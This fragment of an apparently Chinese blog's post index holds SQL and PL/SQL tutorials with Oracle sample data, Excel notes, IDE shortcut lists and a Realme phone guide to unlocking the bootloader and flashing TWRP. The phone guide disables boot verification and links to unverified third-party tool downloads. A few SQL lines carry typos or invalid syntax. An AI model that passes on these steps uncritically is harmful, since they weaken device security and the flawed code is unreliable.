= c.id，classes表的id&#x3D;4的行正是“四班”，但是，students表中并不存在class_id&#x3D;4的行。 有RIGHT OUTER JOIN，就有LEFT OUTER JOIN，以及FULL OUTER JOIN。它们的区别是： INNER JOIN只返回同时存在于两张表的行数据，由于students表的class_fdid包含1，2，3，classes表的id包含1，2，3，4，所以，INNER JOIN根据条件s.class_id = c.id返回的结果集仅包含1，2，3。 RIGHT OUTER JOIN返回右表都存在的行。如果某一行仅在右表存在，那么结果集就会以NULL填充剩下的字段。 LEFT OUTER JOIN则返回左表都存在的行。如果我们给students表增加一行，并添加class_id&#x3D;5，由于classes表并不存在id&#x3D;5的行，所以，LEFT OUTER JOIN的结果会增加一行，对应的class_name是NULL： SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.score FROM students s LEFT OUTER JOIN classes c ON s.class_id &#x3D; c.id; 最后，我们使用FULL OUTER JOIN，它会把两张表的所有记录全部选择出来，并且，自动把对方不存在的列填充为NULL： SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.score FROM students s FULL OUTER JOIN classes c ON s.class_id &#x3D; c.id; 对于这么多种JOIN查询，到底什么使用应该用哪种呢？其实我们用图来表示结果集就一目了然了。 假设查询语句是： SELECT ... FROM tableA ??? JOIN tableB ON tableA.column1 &#x3D; tableB.column2; 我们把tableA看作左表，把tableB看成右表，那么INNER JOIN是选出两张表都存在的记录： LEFT OUTER JOIN是选出左表存在的记录： RIGHT OUTER JOIN是选出右表存在的记录： FULL OUTER JOIN则是选出左右表都存在的记录： 小结JOIN查询需要先确定主表，然后把另一个表的数据“附加”到结果集上； INNER JOIN是最常用的一种JOIN查询，它的语法是SELECT ... FROM &lt;表1&gt; INNER JOIN &lt;表2&gt; ON &lt;条件...&gt;； JOIN查询仍然可以使用WHERE条件和ORDER BY排序。 INSERT 当我们需要向数据库表中插入一条新记录时，就必须使用INSERT语句。 INSERT语句的基本语法是： INSERT INTO &lt;表名&gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...); 例如，我们向students表插入一条新记录，先列举出需要插入的字段名称，然后在VALUES子句中依次写出对应字段的值： INSERT INTO students (class_id, name, gender, score) VALUES (2, &#39;大牛&#39;, &#39;M&#39;, 80); -- 查询并观察结果: SELECT * FROM students; 注意到我们并没有列出id字段，也没有列出id字段对应的值，这是因为id字段是一个自增主键，它的值可以由数据库自己推算出来。此外，如果一个字段有默认值，那么在INSERT语句中也可以不出现。 要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写INSERT INTO students (score, gender, name, class_id) ...，但是对应的VALUES就得变成(80, &#39;M&#39;, &#39;大牛&#39;, 2)。 还可以一次性添加多条记录，只需要在VALUES子句中指定多个记录值，每个记录是由(...)包含的一组值： INSERT INTO students (class_id, name, gender, score) VALUES (1, &#39;大宝&#39;, &#39;M&#39;, 87), (2, &#39;二宝&#39;, &#39;M&#39;, 81); SELECT * FROM students; 小结使用INSERT，我们就可以一次向一个表中插入一条或多条记录。 UPDATE 如果要更新数据库表中的记录，我们就必须使用UPDATE语句。 UPDATE语句的基本语法是： UPDATE &lt;表名&gt; SET 字段1&#x3D;值1, 字段2&#x3D;值2, ... WHERE ...; 例如，我们想更新students表id=1的记录的name和score这两个字段，先写出UPDATE students SET name=&#39;大牛&#39;, score=66，然后在WHERE子句中写出需要更新的行的筛选条件id=1： update students set name&#x3D;&#39;大牛&#39; ,score&#x3D;66 where id&#x3D;4; 注意到UPDATE语句的WHERE条件和SELECT语句的WHERE条件其实是一样的，因此完全可以一次更新多条记录： UPDATE students SET name&#x3D;&#39;小牛&#39;, score&#x3D;77 WHERE id&gt;&#x3D;5 AND id&lt;&#x3D;7; 在UPDATE语句中，更新字段时可以使用表达式。例如，把所有80分以下的同学的成绩加10分： update students set score:&#x3D;score+10 where score&lt;80 其中，SET score=score+10就是给当前行的score字段的值加上了10。 如果WHERE条件没有匹配到任何记录，UPDATE语句不会报错，也不会有任何记录被更新。 最后，要特别小心的是，UPDATE语句可以没有WHERE条件，例如： UPDATE students SET score&#x3D;60; 这时，整个表的所有记录都会被更新。所以，在执行UPDATE语句时要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用UPDATE更新。 MySQL在使用MySQL这类真正的关系数据库时，UPDATE语句会返回更新的行数以及WHERE条件匹配的行数。 例如，更新id=1的记录时： mysql&gt; UPDATE students SET name&#x3D;&#39;大宝&#39; WHERE id&#x3D;1; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 MySQL会返回1，可以从打印的结果Rows matched: 1 Changed: 1看到。 当更新id=999的记录时： mysql&gt; UPDATE students SET name&#x3D;&#39;大宝&#39; WHERE id&#x3D;999; Query OK, 0 rows affected (0.00 sec) Rows matched: 0 Changed: 0 Warnings: 0 MySQL会返回0，可以从打印的结果Rows matched: 0 Changed: 0看到。 小结使用UPDATE，我们就可以一次更新表中的一条或多条记录。 DELETE 如果要删除数据库表中的记录，我们可以使用DELETE语句。 DELETE语句的基本语法是： DELETE FROM &lt;表名&gt; WHERE ...; 例如，我们想删除students表中id=1的记录，就需要这么写： delete from students where id&#x3D;1; 注意到DELETE语句的WHERE条件也是用来筛选需要删除的行，因此和UPDATE类似，DELETE语句也可以一次删除多条记录： delete from studebts where id in(4,5,6) 如果WHERE条件没有匹配到任何记录，DELETE语句不会报错，也不会有任何记录被删除。 最后，要特别小心的是，和UPDATE类似，不带WHERE条件的DELETE语句会删除整个表的数据： DELETE FROM students; 这时，整个表的所有记录都会被删除。所以，在执行DELETE语句时也要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用DELETE删除。 MySQL在使用MySQL这类真正的关系数据库时，DELETE语句也会返回删除的行数以及WHERE条件匹配的行数。 例如，分别执行删除id=1和id=999的记录： mysql&gt; DELETE FROM students WHERE id&#x3D;1; Query OK, 1 row affected (0.01 sec) mysql&gt; DELETE FROM students WHERE id&#x3D;999; Query OK, 0 rows affected (0.01 sec) 小结使用DELETE，我们就可以一次删除表中的一条或多条记录。 PL&#x2F;SQL程序设计附：代码中使用的数据库在文章尾给出 什么是PL&#x2F;SQL?PL&#x2F;SQL是 Procedure Language &amp; Structured Query Language 的缩写。PL&#x2F;SQL是对SQL语言存储过程语言的扩展。 指在SQL命令语言中增加了过程处理语句（如分支、循环等），使SQL语言具有过程处理能力。 把SQL语言的数据操纵能力与过程语言的数据处理能力结合起来，使得PLSQL面向过程但比过程语言简单、高效、灵活和实用。 PL&#x2F;SQL的优点或特征1 有利于客户&#x2F;服务器环境应用的运行 2 适合于客户环境 3 过程化 4 模块化 5 运行错误的可处理性 6 提供大量内置程序包 PL&#x2F;SQL 可用的SQL语句PL&#x2F;SQL是ORACLE系统的核心语言，现在ORACLE的许多部件都是由PL&#x2F;SQL写成。在PL&#x2F;SQL中可以使用的SQL语句有：INSERT，UPDATE，DELETE，SELECT INTO，COMMIT，ROLLBACK，SAVEPOINT。提示：在 PL&#x2F;SQL中只能用 SQL语句中的 DML 部分，不能用 DDL 部分，如果要在PL&#x2F;SQL中使用DDL(如CREATE table 等)的话，只能以动态的方式来使用。ORACLE 的 PL&#x2F;SQL 组件在对 PL&#x2F;SQL 程序进行解释时，同时对在其所使用的表名、列名及数据类型进行检查。PL&#x2F;SQL 可以在SQL*PLUS 中使用。PL&#x2F;SQL 可以在高级语言中使用。PL&#x2F;SQL可以在ORACLE的开发工具中使用(如：SQL Developer或Procedure Builder等)。其它开发工具也可以调用PL&#x2F;SQL编写的过程和函数，如Power Builder 等都可以调用服务器端的PL&#x2F;SQL过程。 PL&#x2F;SQL程序结构及组成 变量和常量说明 第一个PL&#x2F;SQL程序set serveroutput on; &#x2F;&#x2F;打開輸出 declare begin DBMS_OUTPUT.PUT_LINE(&#39;我的第一個pl&#x2F;sql程序&#39;); end; 引用型变量eg: --引用型变量: 查询并打印empno為7521的ename和job declare --定义变量保存ename和job pename emp.ename%type; pjob emp.job%type; begin --查询 select ename,job into pename,pjob from emp where empno&#x3D;7521; DBMS_OUTPUT.PUT_LINE(pename||&#39;的job是&#39;||pjob); end; 记录型变量-- 记录型变量：查询并打印empno為7521的ename和job declare emp_rec emp%rowtype; begin select * into emp_rec from emp where empno&#x3D;7521; DBMS_OUTPUT.PUT_LINE(emp_rec.ename||&#39;的job是&#39;||emp_rec.job); end; if语句判断输入的是正数还是负数 --接受键盘输入 --变量num：是一个地址值，在该地址上保存了输入的值 accept num PROMPT &#39;亲输入一个数字：&#39;; declare pnumber number :&#x3D;&amp;num; begin if pnumber&#x3D;0 then DBMS_OUTPUT.PUT_LINE(&#39;输入的是0&#39;); ELSIF pnumber&gt;0 then dbms_output.put_line(&#39;输入的是正数&#39;); ELSE dbms_output.put_line(&#39;输入的是负数&#39;); end if; end; 求两个数的和----如果要在屏幕上输出信息，需要将serveroutput开关打开 set serveroutput on -- 例6：求两个数得和 -- 接收键盘输入 accept num1 prompt &#39;请输入第一个数&#39; accept num2 prompt &#39;请输入第二个数&#39; declare --定义变量保存输入得数字 pnum1 number :&#x3D;&amp;num1; pnum2 number :&#x3D;&amp;num2; psum number :&#x3D;0; begin psum :&#x3D;pnum1+pnum2; DBMS_OUTPUT.PUT_LINE(pnum1||&#39;+&#39;||pnum2||&#39;&#x3D;&#39;||psum); end; 求1加到n的和使用while--求1加到n的和使用while accept n prompt&#39;请输入n&#39;; declare n number :&#x3D;&amp;n; i number :&#x3D;0; ans number :&#x3D;0; begin while i&lt;n loop ans:&#x3D;ans+i; i:&#x3D;i+1; end loop; dbms_output.put_line(ans); end; 求1加到n的和使用do while--如果要在屏幕上输出信息，需要将serveroutput开关打开 set serveroutput on -- 使用do while:求 1 加到 n 的和(循环) -- 接收键盘输入 accept num prompt &#39;请输入一个数&#39; declare --定义变量保存输入 的数字 pnum number :&#x3D; &amp;num; pn number :&#x3D;1; psum number :&#x3D;0; begin loop exit when pn&gt;pnum; psum :&#x3D;psum+pn; pn :&#x3D;pn+1; end loop; -- 循环结束打印 dbms_output.put_line(&#39;1加到&#39;||pnum||&#39;的和为&#39;||psum); end; 求1加到n的和使用for--如果要在屏幕上输出信息，需要将serveroutput开关打开 set serveroutput on -- 使用for:求 1 加到 n 的和(循环) -- 接收键盘输入 accept num prompt &#39;请输入一个数&#39; declare --定义变量保存输入 的数字 pnum number :&#x3D; &amp;num; psum number :&#x3D;0; begin for I in 1..pnum --for循环的I直接使用，不用定义。1..100表示1到100的意思。不能有分号。 loop psum :&#x3D;psum+I; end loop; -- 循环结束打印 dbms_output.put_line(&#39;1加到&#39;||pnum||&#39;的和为&#39;||psum); end; 给SALESMAN涨10%的工资，给ANALYST涨5%的工资(游标)1、显式游标处理需四个PL&#x2F;SQL步骤： 2、显式游标属性%FOUND 布尔值属性，当最近一次读记录时成功返回，则返回TURE %NOTFOUND 布尔值属性，与%FOUND相反 %ISOPEN 布尔值属性，当游标已打开时返回TURE %ROWCOUNT 数字型属性，返回已从游标中读取的记录数 -- 给SALESMAN涨10%的工资，给ANALYST涨5%的工资 declare pjob emp.job %TYPE; psal emp.sal %type; -- cursor c1 is select emp.job,emp.sal from emp; --定义游标 begin open c1; --打开游标 fetch c1 into pjob,psal; --取一个 while c1 % found loop if pjob&#x3D;&#39;SALESMAN&#39; then psal:&#x3D;psal+psal*0.1; dbms_output.put_line(psal); ELSIF pjob&#x3D;&#39;ANALYST&#39; then psal:&#x3D;psal+psal*0.05; dbms_output.put_line(psal); else dbms_output.put_line(&#39;不需要改&#39;); end if; fetch c1 into pjob,psal; end loop; close c1; --关闭光标 end; 3、游标的for循环 打印出 所有的员工的工资:salary: xxx（使用for循环） declare psal emp.sal %TYPE; cursor c1 is select emp.sal from emp; begin for i in c1 loop dbms_output.put_line(i.sal); end loop; end; 使用游标打印员工的姓名和薪水--使用游标打印员工的姓名和薪水 declare psal emp.sal %TYPE; pname emp.ename %type; cursor c1 is select emp.ename,emp.sal from emp; begin open c1; fetch c1 into pname, psal; while c1 % found loop dbms_output.put_line(pname||&#39;的工资是&#39;||psal); fetch c1 into pname,psal; end loop; close c1; end; 使用带参数的游标打印员工的姓名和薪水--如果要在屏幕上输出信息，需要将serveroutput开关打开 set serveroutput on -- 带参数的游标 打印指定部门的员工的姓名和薪水 declare cursor c1( pno number) is select emp.ename,emp.sal from emp where deptno &#x3D; pno; pname emp.ename %type; psal emp.sal %type; begin open c1(10); loop FETCH c1 into pname,psal; exit when c1 %notfound; dbms_output.put_line(pname||&#39;的工资是&#39;||to_char(psal,&#39;L9,999.99&#39;)); end loop; close c1; end; 打印指定部门的员工信息--打印指定部门的员工信息 set serveroutput on; accept ptnonum prompt &#39;请输入要查询的部门号：&#39;; declare tnonum emp.deptno %type :&#x3D;&amp;ptnonum; cursor c1(dnomun number) is select ename,sal,job,empno from emp where deptno&#x3D;dnomun; pname emp.ename %TYPE; psal emp.sal %type; pjob emp.job %type; pempno emp.empno %type; begin open c1(tnonum); loop FETCH c1 into pname,psal,pjob,pempno; exit when c1 %notfound; dbms_output.put_line(&#39;职位为&#39;||pjob ||&#39;的&#39;||pempno||pname||&#39;的工资为&#39;||psal); end loop; end; 系统例外的使用 系统列外 演示系统列为被0除 -- 系统列外 演示系统列为被0除 declare pnum number; begin pnum:&#x3D;2&#x2F;0; EXCEPTION when zero_divide then dbms_output.put_line(&#39;0不能做分母&#39;); when value_error then dbms_output.put_line(&#39;算数或转换错误&#39;); when others then dbms_output.put_line(&#39;其他错误&#39;); end; 用户自定义例外第一章 绪论考试范围： 数据、数据库、数据库系统的定义与应用、数据库的体系结构、数据库用户与管理员、数据管理技术的发展 基本要求： 掌握数据、数据库、DBA、DBS等基本概念、数据库系统的体系结构。 了解数据管理管理技术的发展、应用领域和发展方向。 数据：是事物的符号表示， 数据的含义是信息，数据是信息的载体，信息是数据的内涵。 数据库：是长期存放在计算机内，有组织，可共享的数据集合。 数据库管理系统（DBMS）：是数据库系统的核心组成部分， 数据库系统（DBS）：是计算机系统中引入数据库后的系统组成，有数据库（DB），操作系统（OS），数据库管理系统（DBMS），应用开发工具，应用系统，用户，数据库管理员（DBA）。 ​ 数据管理管理技术的发展：人工管理阶段、文件系统阶段、数据库系统阶段 数据库系统结构：外模式（用户级）、模式（概念级）、内模式（物理级） ​ 外模式：一个数据库可以有多个外模式，同一外模式可以为一个用户的多个应用系统所用，但一个应用系统只能有一个外模式， ​ 模式：一个数据库系统只能有一个模式 二级映射： 为了实现数据库三级层次的联系和转换，在三级模式之间提供了二级映射 ​ 外模式&#x2F;模式映射 ​ 模式描述的是数据的全局逻辑结构，外模式描述的是数据的局部逻辑结构， ​ 模式&#x2F;内模式映射 附：-------------------------------------------------------- -- File created -十二月-22-2020 -------------------------------------------------------- -------------------------------------------------------- -- DDL for Table BONUS -------------------------------------------------------- CREATE TABLE &quot;BONUS&quot; ( &quot;ENAME&quot; VARCHAR2(10), &quot;JOB&quot; VARCHAR2(9), &quot;SAL&quot; NUMBER, &quot;COMM&quot; NUMBER ); -------------------------------------------------------- -- DDL for Table DEPT -------------------------------------------------------- CREATE TABLE &quot;DEPT&quot; ( &quot;DEPTNO&quot; NUMBER(2, 0), &quot;DNAME&quot; VARCHAR2(14), &quot;LOC&quot; VARCHAR2(13) ); -------------------------------------------------------- -- DDL for Table EMP -------------------------------------------------------- CREATE TABLE &quot;EMP&quot; ( &quot;EMPNO&quot; NUMBER(4, 0), &quot;ENAME&quot; VARCHAR2(10), &quot;JOB&quot; VARCHAR2(9), &quot;MGR&quot; NUMBER(4, 0), &quot;HIREDATE&quot; DATE, &quot;SAL&quot; NUMBER(7, 2), &quot;COMM&quot; NUMBER(7, 2), &quot;DEPTNO&quot; NUMBER(2, 0) ); -------------------------------------------------------- -- DDL for Table SALGRADE -------------------------------------------------------- CREATE TABLE &quot;SALGRADE&quot; ( &quot;GRADE&quot; NUMBER, &quot;LOSAL&quot; NUMBER, &quot;HISAL&quot; NUMBER ); --------------------------------------------------- -- DATA FOR TABLE BONUS -- FILTER &#x3D; none used --------------------------------------------------- REM INSERTING into BONUS --------------------------------------------------- -- END DATA FOR TABLE BONUS --------------------------------------------------- --------------------------------------------------- -- DATA FOR TABLE DEPT -- FILTER &#x3D; none used --------------------------------------------------- REM INSERTING into DEPT INSERT INTO dept ( deptno, dname, loc ) VALUES ( 10, &#39;ACCOUNTING&#39;, &#39;NEW YORK&#39; ); INSERT INTO dept ( deptno, dname, loc ) VALUES (20, &#39;RESEARCH&#39;, &#39;DALLAS&#39; ); INSERT INTO dept ( deptno, dname, loc ) VALUES ( 30, &#39;SALES&#39;, &#39;CHICAGO&#39; ); INSERT INTO dept ( deptno, dname, loc ) VALUES ( 40, &#39;OPERATIONS&#39;, &#39;BOSTON&#39; ); --------------------------------------------------- -- END DATA FOR TABLE DEPT --------------------------------------------------- --------------------------------------------------- -- DATA FOR TABLE EMP -- FILTER &#x3D; none used --------------------------------------------------- REM INSERTING into EMP INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES (7369, &#39;SMITH&#39;, &#39;CLERK&#39;, 7902, to_timestamp(&#39;17-12月-80 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 800, NULL, 20 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7499, &#39;ALLEN&#39;, &#39;SALESMAN&#39;, 7698, to_timestamp(&#39;20-2月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 1600, 300, 30 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7521, &#39;WARD&#39;, &#39;SALESMAN&#39;, 7698, to_timestamp(&#39;22-2月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 1250, 500, 30 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7566, &#39;JONES&#39;, &#39;MANAGER&#39;, 7839, to_timestamp(&#39;02-4月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 2975, NULL, 20 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7654, &#39;MARTIN&#39;, &#39;SALESMAN&#39;, 7698, to_timestamp(&#39;28-9月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 1250, 1400, 30 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7698, &#39;BLAKE&#39;, &#39;MANAGER&#39;, 7839, to_timestamp(&#39;01-5月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 2850, NULL, 30 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7782, &#39;CLARK&#39;, &#39;MANAGER&#39;, 7839, to_timestamp(&#39;09-6月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 2450, NULL, 10 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7788, &#39;SCOTT&#39;, &#39;ANALYST&#39;, 7566, to_timestamp(&#39;19-4月 -87 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 3000, NULL, 20 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7839, &#39;KING&#39;, &#39;PRESIDENT&#39;, NULL, to_timestamp(&#39;17-11月-81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 5000, NULL, 10 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7844, &#39;TURNER&#39;, &#39;SALESMAN&#39;, 7698, to_timestamp(&#39;08-9月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 1500, 0, 30 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7876, &#39;ADAMS&#39;, &#39;CLERK&#39;, 7788, to_timestamp(&#39;23-5月 -87 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 1100, NULL, 20 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7900, &#39;JAMES&#39;, &#39;CLERK&#39;, 7698, to_timestamp(&#39;03-12月-81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 950, NULL, 30 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7902, &#39;FORD&#39;, &#39;ANALYST&#39;, 7566, to_timestamp(&#39;03-12月-81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 3000, NULL, 20 ); INSERT INTO emp ( empno, ename, job, mgr, hiredate, sal, comm, deptno ) VALUES ( 7934, &#39;MILLER&#39;, &#39;CLERK&#39;, 7782, to_timestamp(&#39;23-1月 -82 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;), 1300, NULL, 10 ); --------------------------------------------------- -- END DATA FOR TABLE EMP --------------------------------------------------- --------------------------------------------------- -- DATA FOR TABLE SALGRADE -- FILTER &#x3D; none used --------------------------------------------------- REM INSERTING into SALGRADE INSERT INTO salgrade ( grade, losal, hisal ) VALUES ( 1, 700, 1200 ); INSERT INTO salgrade ( grade, losal, hisal ) VALUES ( 2, 1201, 1400 ); INSERT INTO salgrade ( grade, losal, hisal ) VALUES ( 3, 1401, 2000 ); INSERT INTO salgrade ( grade, losal, hisal ) VALUES ( 4, 2001, 3000 ); INSERT INTO salgrade ( grade, losal, hisal ) VALUES ( 5, 3001, 9999 ); --------------------------------------------------- -- END DATA FOR TABLE SALGRADE --------------------------------------------------- -------------------------------------------------------- -- Constraints for Table EMP -------------------------------------------------------- ALTER TABLE &quot;EMP&quot; ADD CONSTRAINT &quot;PK_EMP&quot; PRIMARY KEY ( &quot;EMPNO&quot; ) ENABLE; -------------------------------------------------------- -- Constraints for Table DEPT -------------------------------------------------------- ALTER TABLE &quot;DEPT&quot; ADD CONSTRAINT &quot;PK_DEPT&quot; PRIMARY KEY ( &quot;DEPTNO&quot; ) ENABLE; -------------------------------------------------------- -------------------------------------------------------- -- Ref Constraints for Table EMP -------------------------------------------------------- ALTER TABLE &quot;EMP&quot; ADD CONSTRAINT &quot;FK_DEPTNO&quot; FOREIGN KEY ( &quot;DEPTNO&quot; ) REFERENCES &quot;DEPT&quot; ( &quot;DEPTNO&quot; ) ENABLE; ----------------------- SELECT ename FROM emp; 参考：廖雪峰的官方网站 Jepson6669 PL&#x2F;SQL程序设计（四）—— 游标"},{"title":"Excel数据整理与分析","path":"/post/1.html","text":"Excel数据整理与分析 应用层工作流程知识点部分需要掌握以下基本知识点:Excel的基本工作流程及工作簿、工作表、行与列、鼠标状态、单元格的相关参数。为后面章节打牢基础! 基本工作流程数据的存储—-》 数据的处理———》数据的分析———》数据的呈现 名词解析 enter image description here 工作簿即一个Excel文件； 工作表分为当前活动工作表和非活动工作表； 如Sheet1 是当前活动工作表；其他的是非活动工作表 Alt text 一个工作簿可容纳255个工作表； 行与列CTRL+Down 可下滑至最后一行，即1048576行； CTRL+Right 可右滑至最右列，文件-选项-公式-R1C1引用样式勾选-确定，可看到有16384列； 单元格每个单元格可村32767个字符 选项卡 enter image description here 选项-自定义功能区 可以更改 编辑栏选项卡-视图可选择显示与否编辑栏 名称框 enter image description here 可对一个区域命名； 鼠标三大状态 选挥柄： 用于选择单元格区域 移动柄：用于移动或配合ctrH键盘复制单元格区域 填充柄：复制、填充单元格区域，包括数据、公式等，双击有惊喜! 实例：一.快速添加序号1.序号栏输入1 2； enter image description here 2.选中1 2这两框，鼠标移到右下角。向下拖动 Alt text 二.快速复制属性 单元格 回顾笔记整理1、Excel的基本 工作流程是数据存储数据整理-数据分析-数据呈现2、一个工作簿默认最多能建255个工作表，内存大的可以更多3、一个工作表有1048576行、16384列”4、一个工作表约172亿个单元格，-个单元格能存放32767个字符5、鼠标三大状态:选择柄、移动柄、填充柄。双击填充柄快速填充需要临近列有数据。下一节我们将学习1.2 Excel规范制表之经典的三表结构"},{"title":"win编程常用快捷键","path":"/post/7362.html","text":"常用快捷键 一、 pycharm常用快捷键编辑类： Ctrl + D 复制选定的区域或行Ctrl + Y 删除选定的行Ctrl + Alt + L 代码格式化Ctrl + Alt + O 优化导入（去掉用不到的包导入）Ctrl + 鼠标 简介&#x2F;进入代码定义Ctrl + &#x2F; 行注释 、取消注释 Ctrl + 左方括号 快速跳到代码开头Ctrl + 右方括号 快速跳到代码末尾Shift + F10 运行Shift + F9 调试 查找&#x2F;替换类： Ctrl + F 当前文件查找Ctrl + R 当前文件替换Ctrl + Shift + F 全局查找Ctrl + Shift + R 全局替换 运行类： Shift + F10 运行Shift + F9 调试Alt + Shift + F10 运行模式配置Alt + Shift + F9 调试模式配置 调试类： F8 单步调试（一行一行走）F7 进入内部Shift + F8 退出Ctrl + F8 在当前行加上断点&#x2F;断点开关Ctrl + Shift + F8 查看所有断点 导航类： Ctrl + N 快速查找类（也可查找当前工程中的文件，以文件名查找）Double Shift 任意位置查找 二、submit text3常用快捷键Ctrl+D 选词 （反复按快捷键，即可继续向下同时选中下一个相同的文本进行同时编辑）Ctrl+G 跳转到相应的行Ctrl+J 合并行（已选择需要合并的多行时）Ctrl+L 选择整行（按住-继续选择下行）Ctrl+M 光标移动至括号内开始或结束的位置Ctrl+T 词互换Ctrl+U 软撤销Ctrl+P 查找当前项目中的文件和快速搜索；输入 @ 查找文件主标题&#x2F;函数；或者输入 : 跳转到文件某行；Ctrl+R 快速列出&#x2F;跳转到某个函数Ctrl+K Backspace 从光标处删除至行首Ctrl+K+B 开启&#x2F;关闭侧边栏Ctrl+KK 从光标处删除至行尾Ctrl+K+T 折叠属性Ctrl+K+U 改为大写Ctrl+K+L 改为小写Ctrl+K+0 展开所有Ctrl+Enter 插入行后（快速换行）Ctrl+Tab 当前窗口中的标签页切换 Ctrl+Shift+A 选择光标位置父标签对儿Ctrl+Shift+D 复制光标所在整行，插入在该行之前ctrl+shift+F 在文件夹内查找，与普通编辑器不同的地方是sublime允许添加多个文件夹进行查找Ctrl+Shift+K 删除整行Ctrl+Shift+L 鼠标选中多行（按下快捷键），即可同时编辑这些行Ctrl+Shift+M 选择括号内的内容（按住-继续选择父括号）Ctrl+Shift+P 打开命令面板Ctrl+Shift+&#x2F; 注释已选择内容Ctrl+Shift+↑可以移动此行代码，与上行互换Ctrl+Shift+↓可以移动此行代码，与下行互换Ctrl+Shift+[ 折叠代码Ctrl+Shift+] 展开代码Ctrl+Shift+Enter 光标前插入行 Ctrl+PageDown 、Ctrl+PageUp 文件按开启的前后顺序切换 Ctrl+Z 撤销Ctrl+Y 恢复撤销Ctrl+F2 设置&#x2F;取消书签Ctrl+&#x2F; 注释整行（如已选择内容，同“Ctrl+Shift+&#x2F;”效果）Ctrl+鼠标左键 可以同时选择要编辑的多处文本 Shift+鼠标右键（或使用鼠标中键）可以用鼠标进行竖向多行选择Shift+F2 上一个书签Shift+Tab 去除缩进Alt+Shift+1（非小键盘）窗口分屏，恢复默认1屏Alt+Shift+2 左右分屏-2列Alt+Shift+3 左右分屏-3列Alt+Shift+4 左右分屏-4列Alt+Shift+5 等分4屏Alt+Shift+8 垂直分屏-2屏Alt+Shift+9 垂直分屏-3屏 Ctrl+Shift+分屏序号 将当前焦点页分配到分屏序号页 Alt+. 闭合当前标签Alt+F3 选中文本按下快捷键，即可一次性选择全部的相同文本进行同时编辑 Tab 缩进 自动完成F2 下一个书签F6 检测语法错误F9 行排序(按a-z)F11 全屏模式"},{"title":"玩机汇总（五）：第三方刷机教程","path":"/post/c9ee.html","text":"刷第三方ROM教程1.解锁BL(已解锁可忽视)解锁工具https://www.lanzous.com/i5oszda(解锁会删除数据,自己记得备份) 准备工作，一台驱动正常的电脑，正常完整的数据线，一台拥有解锁资格的realme手机 1.打开深度测试APP，点击进入深度测试（fastboot）此时手机进入fastboot 2.下载好adb工具包，并且找到对应手机型号的twrp。 2.给twrp的img镜像和vbmeta.img（8kb大小）放入adb工具包。 3.给twrp重命名为（ twrp.img ）。 4.插上数据线连接好手机，打开adb工具包，打开cmd here.exe命令窗口 5.复制命令fastboot flashing unlock到命令窗口 如果手机出现反应询问是否解锁，用音量键选择到第二个UNLOCK THE BOOTLOADER，电源键确认 然后手机自动格式化data分区，然后静静等待开机，选择语言 到此bl解锁完成 如果没有输入命令手机无反应，应该是以下两个问题 1.驱动问题（比较常见） 解决办法：自行下载驱动，没有驱动搞什么机（手动滑稽） 2.usb接口 解决办法： 1.usb接口分为usb2.0 usb3.0更换usb接口即可解决 2.如果所有usb接口都试过仍然无法解决，可以给中间转接一下。淘宝上很多转接头 教程适用于所有realme手机 如果成功就接着往下看吧 2.进入fastboot模式使用电脑adb输入指令fastboot flashing unlock(不行下这个https://www.lanzous.com/i5ovblc) FASTBOOT如果没有自带怎么打开?部分电脑可以直接在cmd输入以下指令cd J:\\Phone\\OPPO RealmeX标准版一键刷recovery工具不行的去下载刷机软件或者找有cmd的fastboot刷机压缩包 3.刷入第三方recovery,TWRP刷入VB1.接着上一步， 2.拔掉数据线关闭命令窗口 3.手机进入fastboot，然后插好数据线，再次打开命令窗口 4.复制命令fastboot –disable-verity –disable-verification flash vbmeta 